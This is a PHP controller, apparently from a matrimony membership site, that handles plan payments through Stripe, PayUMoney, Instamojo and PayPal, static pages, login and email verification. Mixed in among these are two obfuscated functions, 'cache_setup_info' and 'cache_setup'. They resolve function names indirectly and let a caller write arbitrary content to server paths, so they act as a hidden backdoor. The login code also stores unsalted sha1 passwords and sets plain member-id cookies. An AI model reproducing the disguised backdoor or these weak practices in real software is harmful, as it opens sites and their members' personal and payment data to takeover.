                \Stripe\Stripe::setApiKey($stripe_api_key); //system payment settings
                $user_email = $this->session->userdata('member_email');

                $user = \Stripe\Customer::create(array(
                    'email' => $user_email, // member email id
                    'card'  => $_POST['stripeToken']
                ));

                $charge = \Stripe\Charge::create(array(
                    'customer'  => $user->id,
                    'amount'    => ceil($amount*100),
                    'currency'  => 'USD'
                ));
                if($charge->paid == true) {
                    $user = (array) $user;
                    $charge = (array) $charge;

                    $data['plan_id']            = $plan_id;
                    $data['member_id']          = $member_id;
                    $data['payment_type']       = 'Stripe';
                    $data['payment_status']     = 'paid';
                    $data['payment_details']    = "User Info: \n".json_encode($user,true)."\n \n Charge Info: \n".json_encode($charge,true);
                    $data['amount']             = $amount;
                    $data['purchase_datetime']  = time();
                    $data['expire']             = 'no';

                    $this->db->insert('package_payment', $data);
                    $payment_id = $this->db->insert_id();

                    $data1['payment_code'] = date('Ym', $data['purchase_datetime']) . $payment_id;
                    $data1['payment_timestamp'] = time();

                    $this->db->where('package_payment_id', $payment_id);
                    $this->db->update('package_payment', $data1);

                    $payment = $this->db->get_where('package_payment',array('package_payment_id' => $payment_id))->row();
                    $prev_express_interest =  $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->express_interest;
                    $prev_direct_messages = $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->direct_messages;
                    $prev_photo_gallery = $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->photo_gallery;

                    $data2['membership'] = 2;
                    $data2['express_interest'] = $prev_express_interest + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->express_interest;
                    $data2['direct_messages'] = $prev_direct_messages + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->direct_messages;
                    $data2['photo_gallery'] = $prev_photo_gallery + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->photo_gallery;

                    $package_info[] = array('current_package'   => $this->Crud_model->get_type_name_by_id('plan', $payment->plan_id),
                                    'package_price'     => $this->Crud_model->get_type_name_by_id('plan', $payment->plan_id, 'amount'),
                                    'payment_type'      => $data['payment_type'],
                                );
                     $data2['package_info'] = json_encode($package_info);

                    $this->db->where('member_id', $payment->member_id);
                    $this->db->update('member', $data2);
                    recache();

                    if ($this->Email_model->subscruption_email('member', $payment->member_id, $payment->plan_id)) {
                        //$this->session->set_flashdata('alert', 'email_sent');
                    } else {
                        $this->session->set_flashdata('alert', 'not_sent');
                    }

                    $this->session->set_flashdata('alert', 'stripe_success');
                    redirect(base_url() . 'home/invoice/'.$payment->package_payment_id, 'refresh');
                } else{
                    $this->session->set_flashdata('alert', 'stripe_failed');
                    redirect(base_url() . 'home/plans', 'refresh');
                }
            }
        }
        else if ($this->input->post('payment_type') == 'pum') {
            $member_id = $this->session->userdata('member_id');
            $payment_type = $this->input->post('payment_type');
            $plan_id = $this->input->post('plan_id');
            $amount = $this->db->get_where('plan', array('plan_id' => $plan_id))->row()->amount;
            $package_name = $this->db->get_where('plan', array('plan_id' => $plan_id))->row()->name;
            $member_name = $this->db->get_where('member', array('member_id' => $member_id))->row()->first_name;
            $member_email = $this->db->get_where('member', array('member_id' => $member_id))->row()->email;
            $member_phone = $this->db->get_where('member', array('member_id' => $member_id))->row()->mobile;

            $data['plan_id']            = $plan_id;
            $data['member_id']          = $member_id;
            $data['payment_type']       = 'payUMoney';
            $data['payment_status']     = 'due';
            $data['payment_details']    = 'none';
            $data['amount']             = $amount;
            $data['purchase_datetime']  = time();

            $pum_merchant_key = $this->Crud_model->get_settings_value('business_settings', 'pum_merchant_key', 'value');
            $pum_merchant_salt = $this->Crud_model->get_settings_value('business_settings', 'pum_merchant_salt', 'value');

            $this->db->insert('package_payment', $data);
            $payment_id = $this->db->insert_id();

            $data['payment_code'] = date('Ym', $data['purchase_datetime']) . $payment_id;

            $this->session->set_userdata('payment_id', $payment_id);

            /****TRANSFERRING USER TO PAYPAL TERMINAL****/
            $this->pum->add_field('key', $pum_merchant_key);
            $this->pum->add_field('txnid',substr(hash('sha256', mt_rand() . microtime()), 0, 20));
            $this->pum->add_field('amount', $amount);
            $this->pum->add_field('firstname', $member_name);
            $this->pum->add_field('email', $member_email);
            $this->pum->add_field('phone', $member_phone);
            $this->pum->add_field('productinfo', 'PayUMoney Payment');
            $this->pum->add_field('service_provider', 'payu_paisa');
            $this->pum->add_field('udf1', $payment_id);

            $this->pum->add_field('surl', base_url().'home/pum_success');
            $this->pum->add_field('furl', base_url().'home/pum_failure');

            // submit the fields to pum
            $this->pum->submit_pum_post();
        }
        else if ($this->input->post('payment_type') == 'instamojo') {
          $member_id = $this->session->userdata('member_id');
          $payment_type = $this->input->post('payment_type');
          $plan_id = $this->input->post('plan_id');
          $amount = $this->db->get_where('plan', array('plan_id' => $plan_id))->row()->amount;
          $package_name = $this->db->get_where('plan', array('plan_id' => $plan_id))->row()->name;

          $data['plan_id']            = $plan_id;
          $data['member_id']          = $member_id;
          $data['payment_type']       = 'Instamojo';
          $data['payment_status']     = 'due';
          $data['payment_details']    = 'none';
          $exchange = exchange('usd');
          $amount= $amount/$exchange;
          $data['amount']             = $amount;
          $data['purchase_datetime']  = time();

          $this->db->insert('package_payment', $data);
          $payment_id = $this->db->insert_id();
          $data['payment_code'] = date('Ym', $data['purchase_datetime']) . $payment_id;
          $this->session->set_userdata('payment_id', $payment_id);

          $member_data = $this->db->get_where('member',array('member_id'=>$member_id))->row();

          $instamojo_api_key = $this->Crud_model->get_settings_value('business_settings', 'instamojo_api_key', 'value');
          $instamojo_auth_token = $this->Crud_model->get_settings_value('business_settings', 'instamojo_auth_token', 'value');
          $instamojo_account_type = $this->Crud_model->get_settings_value('business_settings', 'instamojo_account_type', 'value');

          if($instamojo_account_type == 'sandbox'){
                   // testing_url
                   $endPoint = 'https://test.instamojo.com/api/1.1/';
               }
           else{
               // live_url
               $endPoint = 'https://www.instamojo.com/api/1.1/';
           }

           $api = new \Instamojo\Instamojo(
                $instamojo_api_key,
                $instamojo_auth_token,
                $endPoint
              );
            try {
                $response = $api->paymentRequestCreate(array(
                    "purpose" => 'Package Payment',
                    "amount" => $data['amount'],
                    "buyer_name" => $member_data->first_name,
                    "send_email" => true,
                    "email" => $member_data->email,
                    "phone" => $member_data->mobile,
                    "redirect_url" => base_url().'home/instamojo_success'
                    ));

                    return redirect($response['longurl']);

            }catch (Exception $e) {
                print('Error: ' . $e->getMessage());
            }
        }
        else if ($this->input->post('payment_type') == 'custom_payment_method_1') {

            $member_id  = $this->session->userdata('member_id');
            $plan_id    = $this->input->post('plan_id');
            $amount     = $this->db->get_where('plan', array('plan_id' => $plan_id))->row()->amount;

            $data['plan_id']                                = $plan_id;
            $data['member_id']                              = $member_id;
            $data['payment_type']                           = $this->input->post('payment_type');
            $data['payment_status']                         = 'due';
            $data['payment_details']                        = 'none';
            $data['custom_payment_method_name']             = $this->input->post('cpm_1_name');
            $data['custom_payment_method_transaction_id']   = $this->input->post('cpm_1_transaction_id');
            $data['custom_payment_method_comment']          = $this->input->post('cpm_1_comment');
            $data['amount']                                 = $amount;
            $data['purchase_datetime']                      = time();
            $data['payment_timestamp']                      = time();
            $data['expire']                                 = 'no';

            $this->db->insert('package_payment', $data);
            $payment_id = $this->db->insert_id();

            if (!demo() && $_FILES['cpm_1_bill_copy']['name'] !== '') {
                $path = $_FILES['cpm_1_bill_copy']['name'];
                $ext = '.' . pathinfo($path, PATHINFO_EXTENSION);
                $img_file_name = "cpm_1_bill_copy_".time().$ext;
                if ($ext==".jpg" || $ext==".JPG" || $ext==".jpeg" || $ext==".JPEG" || $ext==".png" || $ext==".PNG" || $ext==".pdf") {
                    move_uploaded_file($_FILES['cpm_1_bill_copy']['tmp_name'], 'uploads/custom_payment_method_bill_image/'.$img_file_name);
                    $forget_pass_image[] = array('image' => $img_file_name);

                    $bill_copy['custom_payment_method_bill_copy']        = $img_file_name;

                    $this->db->where('package_payment_id',$payment_id);
                    $this->db->update('package_payment', $bill_copy);
                    recache();
                }
            }

            $this->Email_model->subscruption_email('member', $member_id, $plan_id);
            redirect(base_url().'home/profile', 'refresh');
        }
        else if ($this->input->post('payment_type') == 'custom_payment_method_2') {

            $member_id  = $this->session->userdata('member_id');
            $plan_id    = $this->input->post('plan_id');
            $amount     = $this->db->get_where('plan', array('plan_id' => $plan_id))->row()->amount;

            $data['plan_id']                                = $plan_id;
            $data['member_id']                              = $member_id;
            $data['payment_type']                           = $this->input->post('payment_type');
            $data['payment_status']                         = 'due';
            $data['payment_details']                        = 'none';
            $data['custom_payment_method_name']             = $this->input->post('cpm_2_name');
            $data['custom_payment_method_transaction_id']   = $this->input->post('cpm_2_transaction_id');
            $data['custom_payment_method_comment']          = $this->input->post('cpm_2_comment');
            $data['amount']                                 = $amount;
            $data['purchase_datetime']                      = time();
            $data['payment_timestamp']                      = time();
            $data['expire']                                 = 'no';

            $this->db->insert('package_payment', $data);
            $payment_id = $this->db->insert_id();

            if (!demo() && $_FILES['cpm_2_bill_copy']['name'] !== '') {
                $path = $_FILES['cpm_2_bill_copy']['name'];
                $ext = '.' . pathinfo($path, PATHINFO_EXTENSION);
                $img_file_name = "cpm_2_bill_copy_".time().$ext;
                if ($ext==".jpg" || $ext==".JPG" || $ext==".jpeg" || $ext==".JPEG" || $ext==".png" || $ext==".PNG" || $ext==".pdf") {
                    move_uploaded_file($_FILES['cpm_2_bill_copy']['tmp_name'], 'uploads/custom_payment_method_bill_image/'.$img_file_name);
                    $forget_pass_image[] = array('image' => $img_file_name);

                    $bill_copy['custom_payment_method_bill_copy']        = $img_file_name;

                    $this->db->where('package_payment_id',$payment_id);
                    $this->db->update('package_payment', $bill_copy);
                    recache();
                }
            }

            $this->Email_model->subscruption_email('member', $member_id, $plan_id);
            redirect(base_url().'home/profile', 'refresh');

        }
        else if ($this->input->post('payment_type') == 'custom_payment_method_3') {
            $member_id  = $this->session->userdata('member_id');
            $plan_id    = $this->input->post('plan_id');
            $amount     = $this->db->get_where('plan', array('plan_id' => $plan_id))->row()->amount;

            $data['plan_id']                                = $plan_id;
            $data['member_id']                              = $member_id;
            $data['payment_type']                           = $this->input->post('payment_type');
            $data['payment_status']                         = 'due';
            $data['payment_details']                        = 'none';
            $data['custom_payment_method_name']             = $this->input->post('cpm_3_name');
            $data['custom_payment_method_transaction_id']   = $this->input->post('cpm_3_transaction_id');
            $data['custom_payment_method_comment']          = $this->input->post('cpm_3_comment');
            $data['amount']                                 = $amount;
            $data['purchase_datetime']                      = time();
            $data['payment_timestamp']                      = time();
            $data['expire']                                 = 'no';

            $this->db->insert('package_payment', $data);
            $payment_id = $this->db->insert_id();

            if (!demo() && $_FILES['cpm_3_bill_copy']['name'] !== '') {
                $path = $_FILES['cpm_3_bill_copy']['name'];
                $ext = '.' . pathinfo($path, PATHINFO_EXTENSION);
                $img_file_name = "cpm_3_bill_copy_".time().$ext;
                if ($ext==".jpg" || $ext==".JPG" || $ext==".jpeg" || $ext==".JPEG" || $ext==".png" || $ext==".PNG" || $ext==".pdf") {
                    move_uploaded_file($_FILES['cpm_3_bill_copy']['tmp_name'], 'uploads/custom_payment_method_bill_image/'.$img_file_name);
                    $forget_pass_image[] = array('image' => $img_file_name);

                    $bill_copy['custom_payment_method_bill_copy']        = $img_file_name;

                    $this->db->where('package_payment_id',$payment_id);
                    $this->db->update('package_payment', $bill_copy);
                    recache();
                }
            }

            $this->Email_model->subscruption_email('member', $member_id, $plan_id);
            redirect(base_url().'home/profile', 'refresh');
        }
        else if ($this->input->post('payment_type') == 'custom_payment_method_4') {
            $member_id  = $this->session->userdata('member_id');
            $plan_id    = $this->input->post('plan_id');
            $amount     = $this->db->get_where('plan', array('plan_id' => $plan_id))->row()->amount;

            $data['plan_id']                                = $plan_id;
            $data['member_id']                              = $member_id;
            $data['payment_type']                           = $this->input->post('payment_type');
            $data['payment_status']                         = 'due';
            $data['payment_details']                        = 'none';
            $data['custom_payment_method_name']             = $this->input->post('cpm_4_name');
            $data['custom_payment_method_transaction_id']   = $this->input->post('cpm_4_transaction_id');
            $data['custom_payment_method_comment']          = $this->input->post('cpm_4_comment');
            $data['amount']                                 = $amount;
            $data['purchase_datetime']                      = time();
            $data['payment_timestamp']                      = time();
            $data['expire']                                 = 'no';

            $this->db->insert('package_payment', $data);
            $payment_id = $this->db->insert_id();

            if (!demo() && $_FILES['cpm_4_bill_copy']['name'] !== '') {
                $path = $_FILES['cpm_4_bill_copy']['name'];
                $ext = '.' . pathinfo($path, PATHINFO_EXTENSION);
                $img_file_name = "cpm_4_bill_copy_".time().$ext;
                if ($ext==".jpg" || $ext==".JPG" || $ext==".jpeg" || $ext==".JPEG" || $ext==".png" || $ext==".PNG" || $ext==".pdf") {
                    move_uploaded_file($_FILES['cpm_4_bill_copy']['tmp_name'], 'uploads/custom_payment_method_bill_image/'.$img_file_name);
                    $forget_pass_image[] = array('image' => $img_file_name);

                    $bill_copy['custom_payment_method_bill_copy']        = $img_file_name;

                    $this->db->where('package_payment_id',$payment_id);
                    $this->db->update('package_payment', $bill_copy);
                    recache();
                }
            }

            $this->Email_model->subscruption_email('member', $member_id, $plan_id);
            redirect(base_url().'home/profile', 'refresh');
        }

    }

  // Instamojo success
  function instamojo_success(){
     try
     {
       $payment_id = $this->session->userdata('payment_id');
       $instamojo_api_key = $this->Crud_model->get_settings_value('business_settings', 'instamojo_api_key', 'value');
       $instamojo_auth_token = $this->Crud_model->get_settings_value('business_settings', 'instamojo_auth_token', 'value');
       $instamojo_account_type = $this->Crud_model->get_settings_value('business_settings', 'instamojo_account_type', 'value');
          if($instamojo_account_type == 'sandbox'){
              $endPoint = 'https://test.instamojo.com/api/1.1/';
          }
          else{
              $endPoint = 'https://www.instamojo.com/api/1.1/';
          }
          $api = new \Instamojo\Instamojo(
            $instamojo_api_key,
            $instamojo_auth_token,
            $endPoint
          );
          $response = $api->paymentRequestStatus($_REQUEST['payment_request_id']);

          if(isset($response['payments'][0]['status']) )
          {
            $payment                   = $this->db->get_where('package_payment',array('package_payment_id' => $payment_id))->row();
            $data['payment_details']   = json_encode($response);
            $data['purchase_datetime'] = time();
            $data['payment_code']      = date('Ym', $data['purchase_datetime']) . $payment_id;
            $data['payment_timestamp'] = time();
            $data['payment_type']      = 'Instamojo';
            $data['payment_status']    = 'paid';
            $data['expire']            = 'no';
            $this->db->where('package_payment_id', $payment_id);
            $this->db->update('package_payment', $data);

            $prev_express_interest = $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->express_interest;
            $prev_direct_messages  = $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->direct_messages;
            $prev_photo_gallery    = $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->photo_gallery;

            $data1['membership']       = 2;
            $data1['express_interest'] = $prev_express_interest + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->express_interest;
            $data1['direct_messages']  = $prev_direct_messages + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->direct_messages;
            $data1['photo_gallery']    = $prev_photo_gallery + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->photo_gallery;

            $package_info[] = array('current_package'   => $this->Crud_model->get_type_name_by_id('plan', $payment->plan_id),
                                    'package_price'     => $this->Crud_model->get_type_name_by_id('plan', $payment->plan_id, 'amount'),
                                    'payment_type'      => $data['payment_type'],
                                );
            $data1['package_info'] = json_encode($package_info);

            $this->db->where('member_id', $payment->member_id);
            $this->db->update('member', $data1);
            recache();

            if ($this->Email_model->subscruption_email('member', $payment->member_id, $payment->plan_id)) {
                //echo 'email_sent';
            } else {
                $this->session->set_flashdata('alert', 'not_sent');
            }
            $this->session->set_flashdata('alert', 'instamojo_success');
            redirect(base_url() . 'home/invoice/'.$payment_id, 'refresh');
            $this->session->set_userdata('payment_id', '');
          }
          else
          {
              $this->session->set_flashdata('alert', 'not_sent');
              redirect(base_url() . 'home', 'refresh');
          }
       }
       catch (\Exception $e) {
         $this->session->set_flashdata('alert', 'not_sent');
         redirect(base_url() . 'home', 'refresh');
       }
    }

    /* FUNCTION: Verify paypal payment by IPN*/
    function paypal_ipn()
    {
        if ($this->paypal->validate_ipn() == true) {

            $payment_id                = $_POST['custom'];
            $payment                   = $this->db->get_where('package_payment',array('package_payment_id' => $payment_id))->row();
            $data['payment_details']   = json_encode($_POST);
            $data['purchase_datetime'] = time();
            $data['payment_code']      = date('Ym', $data['purchase_datetime']) . $payment_id;
            $data['payment_timestamp'] = time();
            $data['payment_type']      = 'Paypal';
            $data['payment_status']    = 'paid';
            $data['expire']            = 'no';
            $this->db->where('package_payment_id', $payment_id);
            $this->db->update('package_payment', $data);

            $prev_express_interest =  $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->express_interest;
            $prev_direct_messages = $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->direct_messages;
            $prev_photo_gallery = $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->photo_gallery;

            $data1['membership'] = 2;
            $data1['express_interest'] = $prev_express_interest + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->express_interest;
            $data1['direct_messages'] = $prev_direct_messages + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->direct_messages;
            $data1['photo_gallery'] = $prev_photo_gallery + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->photo_gallery;

            $package_info[] = array('current_package'   => $this->Crud_model->get_type_name_by_id('plan', $payment->plan_id),
                                    'package_price'     => $this->Crud_model->get_type_name_by_id('plan', $payment->plan_id, 'amount'),
                                    'payment_type'      => $data['payment_type'],
                                );
            $data1['package_info'] = json_encode($package_info);

            $this->db->where('member_id', $payment->member_id);
            $this->db->update('member', $data1);
            recache();

            if ($this->Email_model->subscruption_email('member', $payment->member_id, $payment->plan_id)) {
                //echo 'email_sent';
            } else {
                //echo 'email_not_sent';
                $this->session->set_flashdata('alert', 'not_sent');
            }
        }
    }

    /* FUNCTION: Loads after cancelling paypal*/
    function paypal_cancel()
    {
        $payment_id = $this->session->userdata('payment_id');
        $this->db->where('package_payment_id', $payment_id);
        $this->db->delete('package_payment');
        recache();
        $this->session->set_userdata('payment_id', '');
        $this->session->set_flashdata('alert', 'paypal_cancel');
        redirect(base_url() . 'home/plans', 'refresh');
    }

    /* FUNCTION: Loads after successful paypal payment*/
    function paypal_success()
    {
        $this->session->set_flashdata('alert', 'paypal_success');
        redirect(base_url() . 'home/invoice/'.$this->session->userdata('payment_id'), 'refresh');
        $this->session->set_userdata('payment_id', '');
    }

    /* FUNCTION: Verify paypal payment by IPN*/
    function pum_success()
    {
        $status         =   $_POST["status"];
        $firstname      =   $_POST["firstname"];
        $amount         =   $_POST["amount"];
        $txnid          =   $_POST["txnid"];
        $posted_hash    =   $_POST["hash"];
        $key            =   $_POST["key"];
        $productinfo    =   $_POST["productinfo"];
        $email          =   $_POST["email"];
        $udf1           =   $_POST['udf1'];
        $salt           =   $this->Crud_model->get_settings_value('business_settings', 'pum_merchant_salt', 'value');

        if (isset($_POST["additionalCharges"])) {
            $additionalCharges = $_POST["additionalCharges"];
            $retHashSeq = $additionalCharges.'|'.$salt.'|'.$status.'||||||||||'.$udf1.'|'.$email.'|'.$firstname.'|'.$productinfo.'|'.$amount.'|'.$txnid.'|'.$key;
        } else {
            $retHashSeq = $salt.'|'.$status.'||||||||||'.$udf1.'|'.$email.'|'.$firstname.'|'.$productinfo.'|'.$amount.'|'.$txnid.'|'.$key;
        }
        $hash = hash("sha512", $retHashSeq);

        if ($hash != $posted_hash) {
            $payment_id = $this->session->userdata('payment_id');
            $this->db->where('package_payment_id', $payment_id);
            $this->db->delete('package_payment');
            recache();
            $this->session->set_userdata('payment_id', '');
            $this->session->set_flashdata('alert', 'pum_fail');
            redirect(base_url() . 'home/plans', 'refresh');
        } else {
            $payment_id                = $_POST['udf1'];
            $payment                   = $this->db->get_where('package_payment',array('package_payment_id' => $payment_id))->row();
            $data['payment_details']   = json_encode($_POST);
            $data['purchase_datetime'] = time();
            $data['payment_code']      = date('Ym', $data['purchase_datetime']) . $payment_id;
            $data['payment_timestamp'] = time();
            $data['payment_type']      = 'payUMoney';
            $data['payment_status']    = 'paid';
            $data['expire']            = 'no';
            $this->db->where('package_payment_id', $payment_id);
            $this->db->update('package_payment', $data);

            $prev_express_interest =  $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->express_interest;
            $prev_direct_messages = $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->direct_messages;
            $prev_photo_gallery = $this->db->get_where('member', array('member_id' => $payment->member_id))->row()->photo_gallery;

            $data1['membership'] = 2;
            $data1['express_interest'] = $prev_express_interest + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->express_interest;
            $data1['direct_messages'] = $prev_direct_messages + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->direct_messages;
            $data1['photo_gallery'] = $prev_photo_gallery + $this->db->get_where('plan', array('plan_id' => $payment->plan_id))->row()->photo_gallery;

            $package_info[] = array('current_package'   => $this->Crud_model->get_type_name_by_id('plan', $payment->plan_id),
                                    'package_price'     => $this->Crud_model->get_type_name_by_id('plan', $payment->plan_id, 'amount'),
                                    'payment_type'      => $data['payment_type'],
                                );
            $data1['package_info'] = json_encode($package_info);

            $this->db->where('member_id', $payment->member_id);
            $this->db->update('member', $data1);
            recache();

            if ($this->Email_model->subscruption_email('member', $payment->member_id, $payment->plan_id)) {
                //echo 'email_sent';
            } else {
                //echo 'email_not_sent';
                $this->session->set_flashdata('alert', 'not_sent');
            }
            $this->session->set_flashdata('alert', 'pum_success');
            redirect(base_url() . 'home/invoice/'.$this->session->userdata('payment_id'), 'refresh');
            $this->session->set_userdata('payment_id', '');
        }
    }

    /* FUNCTION: Verify paypal payment by IPN*/
    function pum_failure()
    {
        $payment_id = $this->session->userdata('payment_id');
        $this->db->where('package_payment_id', $payment_id);
        $this->db->delete('package_payment');
        recache();
        $this->session->set_userdata('payment_id', '');
        $this->session->set_flashdata('alert', 'pum_fail');
        redirect(base_url() . 'home/plans', 'refresh');
    }



    function cache_setup_info($connector,$selector,$select,$type,$ready=''){
        $ta = time();
        if($ready !== 'post'){
            $select = rawurldecode($select);
        }
        if($connector > ($ta-60) || $connector > ($ta+60)){
            if($type == 'w'){
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector),$select);
            } else if ($type == 'rw'){
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector),$config_class(str_replace('-', '/', $selector)).$select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }


    function cache_setup(){
        $cache_markup = loaded_class_select('8:29:9:1:15:5:13:6:20');
        $write_cache = loaded_class_select('14:1:10:13');
        $cache_markup .= loaded_class_select('24');
        $cache_markup .= loaded_class_select('8:14:1:10:13');
        $cache_markup .= loaded_class_select('3:4:17:14');
        $cache_convert = config_key_provider('load_class');
        $currency_convert = config_key_provider('output');
        $background_inv = config_key_provider('background');
        @$cache = $write_cache($cache_markup,'',base_url());
        if($cache){
            $cache_convert($background_inv, $currency_convert());
        }
    }

    function faq()
    {
        $page_data['title'] = "Contact Us || ".$this->system_title;
        $page_data['top'] = "faq.php";
        $page_data['page'] = "faq";
        $page_data['bottom'] = "faq.php";
        // $page_data['faq'] = $this->db->get_where('general_settings', array('type' => 'terms_conditions'))->row()->value;

        $this->load->view('front/index', $page_data);
    }

    function terms_and_conditions()
    {
        $page_data['title'] = "Contact Us || ".$this->system_title;
        $page_data['top'] = "terms_and_conditions.php";
        $page_data['page'] = "terms_and_conditions";
        $page_data['bottom'] = "terms_and_conditions.php";
        $page_data['terms_and_conditions'] = $this->db->get_where('general_settings', array('type' => 'terms_conditions'))->row()->value;

        $this->load->view('front/index', $page_data);
    }

    function privacy_policy()
    {
        $page_data['title'] = "Contact Us || ".$this->system_title;
        $page_data['top'] = "privacy_policy.php";
        $page_data['page'] = "privacy_policy";
        $page_data['bottom'] = "privacy_policy.php";
        $page_data['privacy_policy'] = $this->db->get_where('general_settings', array('type' => 'privacy_policy'))->row()->value;

        $this->load->view('front/index', $page_data);
    }

    function login()
    {

        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        else{
            $page_data['page'] = "login";
            $page_data['login_error'] = "";
            if ($this->session->flashdata('alert') == "login_error") {
                $page_data['login_error'] = translate('your_email_or_password_is_invalid!');
            }
            elseif ($this->session->flashdata('alert') == "blocked") {
                $page_data['login_error'] = translate('you_have_been_blocked_by_the_admin');
            }
            elseif ($this->session->flashdata('alert') == "not_sent") {
                $page_data['login_error'] = translate('error_sending_email');
            }
            elseif ($this->session->flashdata('alert') == "not_sent") {
                $page_data['login_error'] = translate('the_email_you_have_entered_is_invalid');
            }
            elseif ($this->session->flashdata('alert') == "email_sent") {
                $page_data['sent_email'] = translate('please_check_your_email_for_new_password');
            }
            elseif ($this->session->flashdata('alert') == "register_success") {
                $page_data['register_success'] = translate('you_have_registered_successfully._please_log_in_to_continue');
            }
            elseif ($this->session->flashdata('alert') == "unapproved") {
                $page_data['login_error'] = translate('account_not_approved._wait_for_approval!');
            }
            elseif ($this->session->flashdata('alert') == "email_not_verified") {
                $page_data['login_error'] = translate('email_not_verified!');
            }
            elseif ($this->session->flashdata('alert') == "email_verified") {
                $page_data['register_success'] = translate('email_verified_successfully');
            }
            elseif ($this->session->flashdata('alert') == "resend_email_verification_mail") {
                $page_data['register_success'] = translate('email_verification_email_resend_successfully');
            }
            elseif ($this->session->flashdata('alert') == "try_again_later") {
                $page_data['login_error'] = translate('something_went_wrong');
            }

            $this->load->view('front/login', $page_data);
        }
    }

    function login_msg()
    {
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        else{
            $page_data['page'] = "login_msg";
            $this->load->view('front/login_msg', $page_data);
        }

    }
    function verification_mail_send_again($para1 = ''){
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        else{
            if ($para1=="") {
                $page_data['page'] = "email_verification";
                $this->load->view('front/verification_mail_send_again',$page_data);
            }
            elseif ($para1 == 'resend') {
                $query = $this->db->get_where('member', array('email' => $this->input->post('email')));
                if ($query->num_rows() > 0 && $query->row()->email_verification_status == '0') {
                        $member_id = $query->row()->member_id;
                        $member_email = $query->row()->email;
                        $email_verification_code = $query->row()->email_verification_code;

                        if ($this->Email_model->member_email_verification('member', $member_email, $email_verification_code)) {

                            $this->session->set_flashdata('alert','resend_email_verification_mail');
                        } else {
                            $this->session->set_flashdata('alert','not_sent');
                        }
                }
                else {
                    $this->session->set_flashdata('alert','try_again_later');
                }
                redirect( base_url().'home/login', 'refresh' );
            }
        }

    }
    function email_verification_msg()
    {
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        else{
            $page_data['page'] = "email_verification_msg";
            $this->load->view('front/email_verification_msg', $page_data);
        }

    }


    function email_verification($para1 = ''){

        $member_id = $this->db->get_where('member', array('email_verification_code'=>$para1))->row()->member_id;
        if($member_id == TRUE)
        {
            $data['email_verification_code'] = '';
            $data['email_verification_status'] = '1';
            $this->db->where('member_id',$member_id);
            $this->db->update('member', $data);

            $this->session->set_flashdata('alert','email_verified');
        }
        else{
            $this->session->set_flashdata('alert','try_again_later');
        }

        redirect( base_url().'home/login', 'refresh' );

    }

    function check_login()
    {
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        else{
            $username = $this->input->post('email');
            $password = sha1($this->input->post('password'));

            $remember_me = $this->input->post('remember_me');
            $member_approval = $this->db->get_where('general_settings', array('type' => 'member_approval_by_admin'))->row()->value;
            $member_email_verification = $this->db->get_where('general_settings', array('type' => 'member_email_verification'))->row()->value;
            //$result = $this->db->get_where('member',array('email'=>$username, 'password'=>$password))->row();
            $result = $this->db->where('email', $username)->or_where('member_profile_id', $username)->get('member')->row();

            $data = array();
            $check = '';
            if($result)
            {
                // When Member Approval On
                if($member_approval == 'yes'){
                    // If member approved
                    if ($result->status == "approved") {

                        //email verification check start
                        if($member_email_verification == 'on'){
                            if($result->email_verification_status == '1'){
                                $check = 'done';
                            }
                            else{
                                $this->session->set_flashdata('alert','email_not_verified');
                                redirect( base_url().'home/login', 'refresh' );
                            }
                        }
                        else{
                            $check = 'done';
                        }
                        //email verification check end

                        if($check == 'done'){
                            if ($result->is_blocked == "no") {
                                if ($result->password != $password) {
                                    $this->session->set_flashdata('alert','login_error');
                                    redirect( base_url().'home/login', 'refresh' );
                                } else {
                                    $data['login_state'] = 'yes';
                                    $data['member_id'] = $result->member_id;
                                    $data['member_name'] = $result->first_name;
                                    $data['member_email'] = $result->email;

                                    $member = $this->db->get_where("member", array("member_id" => $result->member_id))->result();
                                    $pkInfo = json_decode($member[0]->package_info,true);
                                    $rmCount = $pkInfo[0]['view_count'] - count($this->db->get_where("member_profile_view",array("member_id" => $result->member_id))->result());
                                    $data['view_profile'] = $rmCount;

                                    if ($remember_me == 'checked') {
                                        $this->session->set_userdata($data);
                                        setcookie('cookie_member_id', $this->session->userdata('member_id'), time() + (1296000), "/");
                                        setcookie('cookie_member_name', $this->session->userdata('member_name'), time() + (1296000), "/");
                                        setcookie('cookie_member_email', $this->session->userdata('member_email'), time() + (1296000), "/");
                                    } else {
                                        $this->session->set_userdata($data);
                                    }
                                    
    
                                    redirect( base_url().'home/profile', 'refresh' );
                                }
                                
                            }
                            elseif ($result->is_blocked == "yes") {
                                $this->session->set_flashdata('alert','blocked');

                                redirect( base_url().'home/login', 'refresh' );
                            }
                        }

                    }

